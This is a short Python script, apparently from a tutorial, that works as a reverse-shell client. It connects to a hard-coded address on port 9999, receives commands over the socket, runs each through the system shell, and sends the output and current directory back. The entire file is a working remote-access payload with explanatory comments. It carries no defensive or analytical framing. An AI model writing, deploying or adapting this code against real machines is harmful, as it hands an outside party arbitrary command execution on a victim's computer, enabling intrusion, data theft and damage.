import socket
import os  # Operating system
import subprocess  # processes on our computer

s = socket.socket()
host = "192.168.43.76"
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':     # decoding to string
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        # opening the terminal
        cmd = subprocess.Popen(data[:].decode(
            "utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # popen will start the process which will execute the statement
        # shell is used to give access the shell commands eg. dir
        # stdout is the output of command
        # stderr is the error for wierd command
        # stdin is the input command
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
